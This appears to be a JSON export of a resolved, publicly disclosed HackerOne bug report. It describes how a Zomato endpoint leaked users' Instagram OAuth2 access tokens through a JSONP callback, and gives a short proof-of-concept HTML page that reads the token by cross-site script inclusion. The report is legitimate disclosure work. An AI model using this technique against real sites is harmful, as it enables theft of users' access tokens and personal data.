{"id":138270,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMzgyNzA=","url":"https://hackerone.com/reports/138270","title":"Instagram OAuth2 Implementation Leaks Access Token; Allows for Cross-Site Script Inclusion (XSSI)","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-05-12T12:11:56.128Z","submitted_at":"2016-05-12T12:11:56.128Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"dejavuln","url":"/dejavuln","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/045/064/2158310e1f704a15f20abf07331e73795f2e8153_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":2943,"url":"https://hackerone.com/zomato","handle":"zomato","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/943/71b47f9aa21166f0989dfb97112ca10c66a9d0b2_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/943/71b47f9aa21166f0989dfb97112ca10c66a9d0b2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Zomato","twitter_handle":"Zomato","website":"https://www.zomato.com","about":"The fastest way to search for great places to eat at and order from around you. Serving 24 countries worldwide."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2016-06-22T11:33:44.588Z","bug_reporter_agreed_on_going_public_at":"2016-06-22T11:04:11.754Z","team_member_agreed_on_going_public_at":"2016-06-22T11:33:44.482Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Once a user connects his Zomato account to Instagram (via OAuth2), the page `https://www.zomato.com/php/instagram_tag_relay` leaks the Instagram OAuth2 Access Token issued to Zomato:\n\nPoC:\n`https://www.zomato.com/php/instagram_tag_relay?callback=aaabc`\n\nResult (personal data x'ed):\n```\nHTTP/1.1 200 OK\n[...]\nContent-Type: text/html; charset=UTF-8\n[...]\naaabc({\"data\":[],\"relay_summary\":{\"fresh_img_request_ongoing\":false,\"new_imgs_fetched\":true},\"pagination\":[],\"tag\":\"zomato\",\"user\":{\"user_id\":\"3184xxxx\",\"access_token\":\"3184371440.87c9ab8.xxxxxxxxxxxxxxxxxxxx\",\"username\":\"xxxxxxx\",\"profile_picture\":\"https:\\/\\/igcdn-photos-e-a.akamaihd.net\\/hphotos-ak-xft1\\/t51.2885-19\\/11906329_960xxxxxxxxxxxxx.jpg\",\"email\":\"xxxxxx@example.org\"},\"request\":{\"callback\":\"aaabc\"}})\n```\n\nThis is the result of a _**design issue**_: Zomato is using the OAuth2 Server-Side Flow where an Authorization Code is exchanged for an Access Token. The exchange happens server-side; there should be no need to later expose the Access Token to the end-user as it significantly increases the risk of Access Token leakage.\n\nDue to a _**separate vulnerability**_, gaining access to this Access Token becomes indeed quite easy. An attacker might craft an HTML page, embed the vulnerable page as a script and receive the page content at the function referenced via the `callback` parameter. \n\nPoC:\n```\n\u003chtml\u003e\n\u003cscript\u003e\nfunction aaabc(s)\n{\nalert(JSON.stringify(s));\n}\n\u003c/script\u003e\n\n\u003cscript src=\"https://www.zomato.com/php/instagram_tag_relay?callback=aaabc\"\u003e\u003c/script\u003e\n\n\u003c/html\u003e\n```\n\nResult: \nF93245 \n\nPlease note these are actually two separate issues: \n1. The OAuth2 Access Token should not be exposed to the end-user in the first place. \n2. XSSI / Cross-Site Script Inclusion: sensitive data should not be made accessible in a way that allows it to be processed by a potentially malicious web page.\n","vulnerability_information_html":"\u003cp\u003eOnce a user connects his Zomato account to Instagram (via OAuth2), the page \u003ccode\u003ehttps://www.zomato.com/php/instagram_tag_relay\u003c/code\u003e leaks the Instagram OAuth2 Access Token issued to Zomato:\u003c/p\u003e\n\n\u003cp\u003ePoC:\u003cbr\u003e\n\u003ccode\u003ehttps://www.zomato.com/php/instagram_tag_relay?callback=aaabc\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eResult (personal data x\u0026#39;ed):\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eHTTP/1.1 200 OK\n[...]\nContent-Type: text/html; charset=UTF-8\n[...]\naaabc({\u0026quot;data\u0026quot;:[],\u0026quot;relay_summary\u0026quot;:{\u0026quot;fresh_img_request_ongoing\u0026quot;:false,\u0026quot;new_imgs_fetched\u0026quot;:true},\u0026quot;pagination\u0026quot;:[],\u0026quot;tag\u0026quot;:\u0026quot;zomato\u0026quot;,\u0026quot;user\u0026quot;:{\u0026quot;user_id\u0026quot;:\u0026quot;3184xxxx\u0026quot;,\u0026quot;access_token\u0026quot;:\u0026quot;3184371440.87c9ab8.xxxxxxxxxxxxxxxxxxxx\u0026quot;,\u0026quot;username\u0026quot;:\u0026quot;xxxxxxx\u0026quot;,\u0026quot;profile_picture\u0026quot;:\u0026quot;https:\\/\\/igcdn-photos-e-a.akamaihd.net\\/hphotos-ak-xft1\\/t51.2885-19\\/11906329_960xxxxxxxxxxxxx.jpg\u0026quot;,\u0026quot;email\u0026quot;:\u0026quot;xxxxxx@example.org\u0026quot;},\u0026quot;request\u0026quot;:{\u0026quot;callback\u0026quot;:\u0026quot;aaabc\u0026quot;}})\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis is the result of a \u003cu\u003e\u003cstrong\u003edesign issue\u003c/strong\u003e\u003c/u\u003e: Zomato is using the OAuth2 Server-Side Flow where an Authorization Code is exchanged for an Access Token. The exchange happens server-side; there should be no need to later expose the Access Token to the end-user as it significantly increases the risk of Access Token leakage.\u003c/p\u003e\n\n\u003cp\u003eDue to a \u003cu\u003e\u003cstrong\u003eseparate vulnerability\u003c/strong\u003e\u003c/u\u003e, gaining access to this Access Token becomes indeed quite easy. An attacker might craft an HTML page, embed the vulnerable page as a script and receive the page content at the function referenced via the \u003ccode\u003ecallback\u003c/code\u003e parameter. \u003c/p\u003e\n\n\u003cp\u003ePoC:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;html\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;script\u0026gt;\u003c/span\u003e\n\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003eaaabc\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003es\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003cspan class=\"nx\"\u003ealert\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eJSON\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003estringify\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003es\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/script\u0026gt;\u003c/span\u003e\n\n\u003cspan class=\"nt\"\u003e\u0026lt;script \u003c/span\u003e\u003cspan class=\"na\"\u003esrc=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;https://www.zomato.com/php/instagram_tag_relay?callback=aaabc\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;/script\u0026gt;\u003c/span\u003e\n\n\u003cspan class=\"nt\"\u003e\u0026lt;/html\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eResult: \u003cbr\u003e\n\u003ca class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"instagram-oauth2-atleak.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/093/245/452409d977e2c348565e9fee8e25e00d78f3ca55/instagram-oauth2-atleak.png?response-content-disposition=attachment%3B%20filename%3D%22instagram-oauth2-atleak.png%22%3B%20filename%2A%3DUTF-8%27%27instagram-oauth2-atleak.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ65C6B2IJ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T042716Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIDUDlftdKCwahQOnPUKizOkg2EzWpa90Y7MV2cJRjoCFAiEA7Y2OQGIwYjcI2ewX5wzy7TrFHvDUf%2BCIL8e2DBoQ8fsqtAMIUxABGgwwMTM2MTkyNzQ4NDkiDKstxWWwDBb9kBJ3SSqRAyYWn3xpHc0USlh6j0wUSD0P5lO2wLxrjvfOA2dyjKZVBt1gxJU12nqIqX3KIg9FMETGEwUxbJSTMSoAcGPp86A4SMVO8Ppo%2FbSGSoejkYE57Bm25m03qu80tv22vPGnS25uBEQwCGHzeB2vvgj1L%2F15%2FdzT0%2BG4%2F74LUGHuubNg%2B1XOneA7L7zqEmAAr70tzAVWPrguJqems75lbK%2BgcQwymG9sVI%2Fc6Td6ZStY2vC4MGQhtj%2FB2Gxx7UAazrOqjIGb1G9qSrFARMAiCA7vgzOMlozejJvfAqou2z6NM3lDtH8wHmf%2B04QN5xiDr1wHZOWKVAIeC5Ng5ZOHrGZHtIwdpNYeb2lpY41KE2SAlCRzfQencarj%2BFbPOGd%2BdHnCDIJlkJ1M1OhMbkMpBhgRTzJvpjEERD9SlENQz5LcU8UE9skEafYGlX74JBQCbHp8ggo6mahYoFYYmhlSHgdatm%2B%2B80xz%2FD0LdF7MbyN1WO9WSpnnpVn2rGssLX2aL6wHE4ounfUDQ%2B4P4CmCmYXO1gdWMISXqv8FOusBPH9k2FVakiaEQK4YvWltErNybc3TWS8xjxBe6uFjakG136A%2F7cfMlNRnx071vXJ5t%2FnQ0DZo2Y862T0BMLrHkL3Pal5DQwlhftJzzG0wIFtIf3KfvhKUoOTyenebyJM9PSNwU%2Faz7Lk6mjCUBlIcBPoaXxLvWVV5GfzpPmZeYyz44K91%2B%2BJNPxEcwRShDiit42CCyNfZyC8VIfo21uwKB4nV6gkhX8R%2Blh0KSG1wieFtWcFGCxcDONA9mTKdk1sq7POkUsFpKtFYS%2BgWPlrqp9a%2FEOoUGn3Q91oQVzp5eFzuVvos0aQZvs39%2Bw%3D%3D\u0026amp;X-Amz-Signature=f34ca63bc44830bf285dfaf91ba8cbcad9cd3721d1e4fc5f8a5c93137a69fca7\" data-attachment-type=\"image/png\"\u003einstagram-oauth2-atleak.png (F93245)\u003c/a\u003e \u003c/p\u003e\n\n\u003cp\u003ePlease note these are actually two separate issues: \u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eThe OAuth2 Access Token should not be exposed to the end-user in the first place. \u003c/li\u003e\n\u003cli\u003eXSSI / Cross-Site Script Inclusion: sensitive data should not be made accessible in a way that allows it to be processed by a potentially malicious web page.\u003c/li\u003e\n\u003c/ol\u003e\n","weakness":{"id":18,"name":"Information Disclosure"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":93245,"file_name":"instagram-oauth2-atleak.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/093/245/452409d977e2c348565e9fee8e25e00d78f3ca55/instagram-oauth2-atleak.png?response-content-disposition=attachment%3B%20filename%3D%22instagram-oauth2-atleak.png%22%3B%20filename%2A%3DUTF-8%27%27instagram-oauth2-atleak.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ65C6B2IJ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T042716Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIDUDlftdKCwahQOnPUKizOkg2EzWpa90Y7MV2cJRjoCFAiEA7Y2OQGIwYjcI2ewX5wzy7TrFHvDUf%2BCIL8e2DBoQ8fsqtAMIUxABGgwwMTM2MTkyNzQ4NDkiDKstxWWwDBb9kBJ3SSqRAyYWn3xpHc0USlh6j0wUSD0P5lO2wLxrjvfOA2dyjKZVBt1gxJU12nqIqX3KIg9FMETGEwUxbJSTMSoAcGPp86A4SMVO8Ppo%2FbSGSoejkYE57Bm25m03qu80tv22vPGnS25uBEQwCGHzeB2vvgj1L%2F15%2FdzT0%2BG4%2F74LUGHuubNg%2B1XOneA7L7zqEmAAr70tzAVWPrguJqems75lbK%2BgcQwymG9sVI%2Fc6Td6ZStY2vC4MGQhtj%2FB2Gxx7UAazrOqjIGb1G9qSrFARMAiCA7vgzOMlozejJvfAqou2z6NM3lDtH8wHmf%2B04QN5xiDr1wHZOWKVAIeC5Ng5ZOHrGZHtIwdpNYeb2lpY41KE2SAlCRzfQencarj%2BFbPOGd%2BdHnCDIJlkJ1M1OhMbkMpBhgRTzJvpjEERD9SlENQz5LcU8UE9skEafYGlX74JBQCbHp8ggo6mahYoFYYmhlSHgdatm%2B%2B80xz%2FD0LdF7MbyN1WO9WSpnnpVn2rGssLX2aL6wHE4ounfUDQ%2B4P4CmCmYXO1gdWMISXqv8FOusBPH9k2FVakiaEQK4YvWltErNybc3TWS8xjxBe6uFjakG136A%2F7cfMlNRnx071vXJ5t%2FnQ0DZo2Y862T0BMLrHkL3Pal5DQwlhftJzzG0wIFtIf3KfvhKUoOTyenebyJM9PSNwU%2Faz7Lk6mjCUBlIcBPoaXxLvWVV5GfzpPmZeYyz44K91%2B%2BJNPxEcwRShDiit42CCyNfZyC8VIfo21uwKB4nV6gkhX8R%2Blh0KSG1wieFtWcFGCxcDONA9mTKdk1sq7POkUsFpKtFYS%2BgWPlrqp9a%2FEOoUGn3Q91oQVzp5eFzuVvos0aQZvs39%2Bw%3D%3D\u0026X-Amz-Signature=f34ca63bc44830bf285dfaf91ba8cbcad9cd3721d1e4fc5f8a5c93137a69fca7","file_size":31880,"type":"image/png"}],"allow_singular_disclosure_at":"2016-07-22T11:04:11.861Z","allow_singular_disclosure_after":-140030584.4817423,"singular_disclosure_allowed":true,"vote_count":9,"voters":["bogdantcaciuc","sasi2103","mahmoud_osama","zeroknife","dyabla","rs5082000","pei","abdulxhannan","ms001"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":991761,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hi @dejavuln,\nThanks for your report.\nWe are investigating this issue.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/dejavuln\"\u003e@dejavuln\u003c/a\u003e,\u003cbr\u003e\nThanks for your report.\u003cbr\u003e\nWe are investigating this issue.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-05-31T05:58:57.737Z","updated_at":"2016-05-31T05:58:57.737Z","actor":{"username":"chicken-tikka","cleared":false,"url":"/chicken-tikka","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/059/568/cdbb30fd8932f00a06868a737ab5bdc5c57e5f00_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":992142,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks for keeping @Zomato safe.","markdown_message":"\u003cp\u003eThanks for keeping \u003ca href=\"/zomato\"\u003e@Zomato\u003c/a\u003e safe.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-05-31T10:58:46.368Z","updated_at":"2016-05-31T10:58:46.368Z","actor":{"username":"chicken-tikka","cleared":false,"url":"/chicken-tikka","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/059/568/cdbb30fd8932f00a06868a737ab5bdc5c57e5f00_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"dejavuln","url":"/dejavuln"},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1028065,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-06-22T11:04:11.800Z","updated_at":"2016-06-22T11:04:11.800Z","first_to_agree":true,"actor":{"username":"dejavuln","cleared":false,"url":"/dejavuln","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/045/064/2158310e1f704a15f20abf07331e73795f2e8153_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1028102,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-06-22T11:33:44.503Z","updated_at":"2016-06-22T11:33:44.503Z","actor":{"username":"chicken-tikka","cleared":false,"url":"/chicken-tikka","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/059/568/cdbb30fd8932f00a06868a737ab5bdc5c57e5f00_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1028103,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-06-22T11:33:44.611Z","updated_at":"2016-06-22T11:33:44.611Z","actor":{"username":"chicken-tikka","cleared":false,"url":"/chicken-tikka","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/059/568/cdbb30fd8932f00a06868a737ab5bdc5c57e5f00_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5206764,"is_internal":false,"editable":false,"type":"Activities::NotEligibleForBounty","message":"","markdown_message":"","automated_response":false,"created_at":"2019-06-27T14:51:21.733Z","updated_at":"2019-06-27T14:51:21.733Z","actor":{"url":"/zomato","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/943/71b47f9aa21166f0989dfb97112ca10c66a9d0b2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Zomato"}},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}